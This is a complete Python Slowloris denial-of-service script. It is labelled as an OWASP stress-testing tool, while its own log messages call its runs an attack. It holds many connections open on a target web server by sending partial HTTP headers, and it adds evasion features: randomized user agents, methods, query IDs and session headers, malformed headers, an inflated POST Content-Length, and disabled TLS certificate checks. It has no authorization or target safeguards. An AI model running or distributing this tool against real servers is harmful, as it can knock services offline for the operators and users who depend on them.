#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time

parser = argparse.ArgumentParser(description="Enhanced Slowloris for OWASP stress testing")
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument("-p", "--port", default=80, help="Port of webserver, usually 80", type=int)
parser.add_argument("-s", "--sockets", default=200, help="Number of sockets to use in the test", type=int)
parser.add_argument("-v", "--verbose", action="store_true", help="Increases logging")
parser.add_argument("-ua", "--randuseragents", action="store_true", help="Randomizes user-agents with each request")
parser.add_argument("--https", action="store_true", help="Use HTTPS for the requests")
parser.add_argument("--sleeptime", default=10, type=int, help="Time to sleep between each header sent.")
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

def send_line(self, line):
    self.send(f"{line}\r\n".encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

if args.https:
    import ssl
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

list_of_sockets = []

def init_socket(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        if args.https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=args.host)

        s.connect((ip, args.port))
        method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
        uri = f"/?id={random.randint(1000,9999)}"
        s.send_line(f"{method} {uri} HTTP/1.1")

        ua = random.choice(user_agents) if args.randuseragents else user_agents[0]
        s.send_header("User-Agent", ua)
        s.send_header("Accept", random.choice(["*/*", "application/json", "text/html"]))
        s.send_header("Accept-Language", "en-US,en;q=0.9")
        s.send_header("X-Session-ID", ''.join(random.choices("abcdef0123456789", k=16)))

        if method == "POST":
            s.send_header("Content-Length", "100000")
            s.send_line("")
            s.send("a".encode("utf-8"))
        else:
            s.send_line("")

        return s
    except socket.error as e:
        logging.debug("Socket init failed: %s", e)
        return None

def slowloris_iteration():
    logging.info("Sending keep-alive headers to %d sockets", len(list_of_sockets))
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
            if random.random() < 0.3:
                s.send_header(f"X-Malformed-{random.randint(1,100)}", "")
        except socket.error:
            list_of_sockets.remove(s)

    while len(list_of_sockets) < args.sockets:
        s = init_socket(args.host)
        if s:
            list_of_sockets.append(s)
        else:
            break

def main():
    logging.info("Starting attack on %s using %d sockets", args.host, args.sockets)
    for _ in range(args.sockets):
        s = init_socket(args.host)
        if s:
            list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Attack stopped by user")
            break
        except Exception as e:
            logging.debug("Exception during iteration: %s", e)
        time.sleep(args.sleeptime + random.randint(-2, 2))

if __name__ == "__main__":
    main()
